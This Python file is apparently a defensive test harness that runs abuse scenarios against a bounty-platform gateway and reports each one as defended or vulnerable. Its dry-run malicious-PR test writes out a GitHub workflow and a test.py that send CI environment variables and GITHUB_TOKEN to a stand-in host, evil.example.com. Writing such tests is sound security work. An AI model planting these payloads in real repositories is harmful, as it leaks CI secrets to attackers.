"""
Adversarial solver sim — exercises abuse scenarios against the gateway and feed.

Tests that the system correctly rejects or handles:
  1. Double-claim: claim a bounty already claimed by someone else
  2. Fake fix: submit a PR that doesn't fix anything, try to trigger payout
  3. Budget drain: claim bounty, burn inference tokens without submitting a fix
  4. Identity spoof: claim with a non-existent or someone else's agent_id
  5. Replay: resubmit an old proof to claim a new bounty
  6. Race condition: two solvers claim the same bounty simultaneously
  7. Malicious PR: inject code that exfiltrates secrets from CI env
  8. Bounty sniping: watch for someone else's fix, front-run the claim
  9. Oracle manipulation: try to submit a fake validation directly
  10. Credit theft: try to use another solver's bnet_token

Usage:
  python sim/malicious.py --gateway https://gateway.stare.network --attack all
  python sim/malicious.py --attack double-claim
  python sim/malicious.py --attack budget-drain
"""
import os
import sys
import json
import time
import argparse
import logging
import requests
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [malicious] %(message)s",
)
log = logging.getLogger("malicious")

GATEWAY = os.environ.get("BOUNTYNET_GATEWAY", "https://gateway.stare.network")


def set_gateway(url: str):
    global GATEWAY
    GATEWAY = url


def gw(path, **kwargs):
    """Quick gateway request."""
    method = kwargs.pop("method", "GET")
    if method == "POST":
        return requests.post(f"{GATEWAY}{path}", **kwargs, timeout=15)
    return requests.get(f"{GATEWAY}{path}", **kwargs, timeout=15)


# ── Attack 1: Double Claim ─────────────────────────────────────

def attack_double_claim():
    """Try to claim a bounty that's already claimed."""
    log.info("=== ATTACK: double-claim ===")

    bounties = gw("/bounties").json().get("bounties", [])
    claimed = [b for b in bounties if not b.get("claimable") and not b.get("resolved")]

    if not claimed:
        log.info("no claimed bounties to test against, creating setup...")
        # Claim one first
        claimable = [b for b in bounties if b.get("claimable")]
        if not claimable:
            log.warning("no bounties available at all")
            return {"attack": "double-claim", "result": "SKIP", "reason": "no bounties"}

        ctx = claimable[0]["context_hash"]
        first = gw("/bounties/" + ctx + "/claim", method="POST", json={"agent_id": 1}).json()
        log.info("first claim: %s", first.get("status", first.get("error")))
        target_hash = ctx
    else:
        target_hash = claimed[0]["context_hash"]

    # Now try to claim the same bounty with a different agent
    second = gw(f"/bounties/{target_hash}/claim", method="POST", json={"agent_id": 999}).json()

    if second.get("error") == "already claimed":
        log.info("PASS — double-claim correctly rejected: %s", second["error"])
        return {"attack": "double-claim", "result": "DEFENDED", "response": second}
    else:
        log.error("FAIL — double-claim was NOT rejected: %s", second)
        return {"attack": "double-claim", "result": "VULNERABLE", "response": second}


# ── Attack 2: Identity Spoof ──────────────────────────────────

def attack_identity_spoof():
    """Try to claim with a non-existent agent_id."""
    log.info("=== ATTACK: identity-spoof ===")

    bounties = gw("/bounties").json().get("bounties", [])
    claimable = [b for b in bounties if b.get("claimable")]

    if not claimable:
        return {"attack": "identity-spoof", "result": "SKIP", "reason": "no claimable bounties"}

    ctx = claimable[0]["context_hash"]

    # Try with agent_id that doesn't exist on-chain
    fake_ids = [0, -1, 99999, 2**64 - 1]
    results = []

    for fake_id in fake_ids:
        resp = gw(f"/bounties/{ctx}/claim", method="POST", json={"agent_id": fake_id}).json()
        results.append({"agent_id": fake_id, "response": resp})
        log.info("  agent_id=%s → %s", fake_id, resp.get("status", resp.get("error", "?")))

    rejected = all(r["response"].get("error") for r in results)
    return {
        "attack": "identity-spoof",
        "result": "DEFENDED" if rejected else "VULNERABLE",
        "details": results,
    }


# ── Attack 3: Race Condition ──────────────────────────────────

def attack_race_condition():
    """Two solvers claim the same bounty simultaneously."""
    log.info("=== ATTACK: race-condition ===")

    bounties = gw("/bounties").json().get("bounties", [])
    claimable = [b for b in bounties if b.get("claimable")]

    if not claimable:
        return {"attack": "race-condition", "result": "SKIP", "reason": "no claimable bounties"}

    ctx = claimable[0]["context_hash"]
    results = [None, None]

    def claim(idx, agent_id):
        results[idx] = gw(f"/bounties/{ctx}/claim", method="POST", json={"agent_id": agent_id}).json()

    # Fire both claims at the same time
    t1 = threading.Thread(target=claim, args=(0, 1))
    t2 = threading.Thread(target=claim, args=(1, 2))
    t1.start()
    t2.start()
    t1.join()
    t2.join()

    successes = sum(1 for r in results if r and r.get("status") == "claimed")
    log.info("simultaneous claims: %d succeeded", successes)

    if successes <= 1:
        log.info("PASS — at most one claim succeeded")
        return {"attack": "race-condition", "result": "DEFENDED", "details": results}
    else:
        log.error("FAIL — both claims succeeded (double spend!)")
        return {"attack": "race-condition", "result": "VULNERABLE", "details": results}


# ── Attack 4: Fake Oracle ─────────────────────────────────────

def attack_fake_oracle():
    """Try to submit a fake validation directly."""
    log.info("=== ATTACK: fake-oracle ===")

    # Try to call /oracle without a valid webhook signature
    fake_payload = {
        "action": "completed",
        "check_run": {
            "conclusion": "success",
            "head_sha": "deadbeef",
            "name": "fake-check",
        },
        "repository": {"full_name": "maceip/BountyNet"},
        "installation": {"id": 1},
    }

    resp = gw("/oracle", method="POST",
              json=fake_payload,
              headers={"X-GitHub-Event": "check_run"})

    if resp.status_code == 401:
        log.info("PASS — fake oracle rejected (401): %s", resp.json())
        return {"attack": "fake-oracle", "result": "DEFENDED", "status": resp.status_code}
    else:
        log.error("FAIL — fake oracle accepted (%d): %s", resp.status_code, resp.text[:200])
        return {"attack": "fake-oracle", "result": "VULNERABLE", "status": resp.status_code}


# ── Attack 5: Budget Drain ────────────────────────────────────

def attack_budget_drain():
    """Claim bounty, burn inference tokens without submitting a fix."""
    log.info("=== ATTACK: budget-drain ===")

    bounties = gw("/bounties").json().get("bounties", [])
    claimable = [b for b in bounties if b.get("claimable")]

    if not claimable:
        return {"attack": "budget-drain", "result": "SKIP", "reason": "no claimable bounties"}

    ctx = claimable[0]["context_hash"]
    claim = gw(f"/bounties/{ctx}/claim", method="POST", json={"agent_id": 1}).json()

    if claim.get("error"):
        return {"attack": "budget-drain", "result": "SKIP", "reason": claim["error"]}

    bnet_token = claim.get("bnet_token", "")

    # Try to make inference calls and burn the budget
    burn_count = 0
    for i in range(5):
        resp = requests.post(
            f"{GATEWAY}/v1/messages",
            headers={
                "Authorization": f"Bearer {bnet_token}",
                "Content-Type": "application/json",
            },
            json={
                "model": "claude-sonnet-4-20250514",
                "max_tokens": 100,
                "messages": [{"role": "user", "content": f"Say hello {i}"}],
            },
            timeout=30,
        )
        if resp.status_code == 200:
            burn_count += 1
        else:
            log.info("  inference call %d blocked: %s", i, resp.status_code)
            break

    # Check remaining budget
    budget = gw(f"/budget/{ctx}").json()
    remaining = budget.get("remaining", "?")

    log.info("burned %d inference calls, remaining budget: %s", burn_count, remaining)

    # The question: can we burn ALL tokens without submitting a fix?
    # Currently no budget enforcement → VULNERABLE
    # With budget cap → DEFENDED
    return {
        "attack": "budget-drain",
        "result": "PARTIAL" if burn_count < 5 else "VULNERABLE",
        "burned": burn_count,
        "remaining": remaining,
    }


# ── Attack 6: Stolen Token ───────────────────────────────────

def attack_stolen_token():
    """Try to use a fabricated bnet_token."""
    log.info("=== ATTACK: stolen-token ===")

    # Fabricate a token for agent 1, random context
    fake_token = "bnet_1:0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef"

    resp = requests.post(
        f"{GATEWAY}/v1/messages",
        headers={
            "Authorization": f"Bearer {fake_token}",
            "Content-Type": "application/json",
        },
        json={
            "model": "claude-sonnet-4-20250514",
            "max_tokens": 10,
            "messages": [{"role": "user", "content": "hi"}],
        },
        timeout=15,
    )

    if resp.status_code in (401, 403, 500):
        log.info("PASS — fabricated token rejected (%d)", resp.status_code)
        return {"attack": "stolen-token", "result": "DEFENDED", "status": resp.status_code}
    elif resp.status_code == 200:
        # Check if it used a real key or fell back to platform
        data = resp.json()
        source = data.get("_bountynet", {}).get("key_source", "?")
        if source == "platform":
            log.warning("PARTIAL — fell through to platform key (no staker key for fake context)")
            return {"attack": "stolen-token", "result": "PARTIAL", "key_source": source}
        else:
            log.error("FAIL — fabricated token worked with %s key", source)
            return {"attack": "stolen-token", "result": "VULNERABLE", "key_source": source}
    else:
        log.info("response: %d %s", resp.status_code, resp.text[:200])
        return {"attack": "stolen-token", "result": "UNKNOWN", "status": resp.status_code}


# ── Attack 7: Malicious PR ────────────────────────────────────

def attack_malicious_pr():
    """
    Submit a PR that tries to exfiltrate secrets from CI.
    Tests whether the system/CI catches malicious code.
    """
    log.info("=== ATTACK: malicious-pr (dry run) ===")

    # We DON'T actually submit this — just log what it would contain
    malicious_files = [
        {
            "path": ".github/workflows/exfil.yml",
            "content": "name: exfil\non: push\njobs:\n  steal:\n    runs-on: ubuntu-latest\n    steps:\n      - run: env | curl -X POST -d @- https://evil.example.com/steal",
        },
        {
            "path": "test.py",
            "content": "import os; os.system('curl https://evil.example.com/steal?key=' + os.environ.get('GITHUB_TOKEN', ''))",
        },
    ]

    log.info("SIMULATED — would submit %d malicious files", len(malicious_files))
    log.info("  - .github/workflows/exfil.yml (env exfiltration)")
    log.info("  - test.py (token theft)")
    log.info("  DEFENSE NEEDED: CI sandbox, secret masking, branch protection rules")

    return {
        "attack": "malicious-pr",
        "result": "SIMULATED",
        "note": "Not submitted — would test CI secret isolation",
        "files": [f["path"] for f in malicious_files],
    }


# ── Main ──────────────────────────────────────────────────────

ALL_ATTACKS = {
    "double-claim": attack_double_claim,
    "identity-spoof": attack_identity_spoof,
    "race-condition": attack_race_condition,
    "fake-oracle": attack_fake_oracle,
    "budget-drain": attack_budget_drain,
    "stolen-token": attack_stolen_token,
    "malicious-pr": attack_malicious_pr,
}


def main():
    parser = argparse.ArgumentParser(description="Adversarial solver sim — gateway abuse tests")
    parser.add_argument("--gateway", default=GATEWAY)
    parser.add_argument("--attack", default="all", help="Attack name or 'all'")
    parser.add_argument("--json", action="store_true", help="JSON output")
    args = parser.parse_args()

    set_gateway(args.gateway)

    attacks = ALL_ATTACKS if args.attack == "all" else {args.attack: ALL_ATTACKS[args.attack]}
    results = {}

    for name, fn in attacks.items():
        try:
            results[name] = fn()
        except Exception as e:
            log.error("attack %s crashed: %s", name, e)
            results[name] = {"attack": name, "result": "ERROR", "error": str(e)}

    # Summary
    if args.json:
        print(json.dumps(results, indent=2))
    else:
        log.info("\n=== RESULTS ===")
        for name, r in results.items():
            status = r.get("result", "?")
            icon = {"DEFENDED": "+", "VULNERABLE": "!", "PARTIAL": "~", "SKIP": "-", "SIMULATED": "?", "ERROR": "X"}.get(status, "?")
            log.info("  [%s] %s: %s", icon, name, status)


if __name__ == "__main__":
    main()
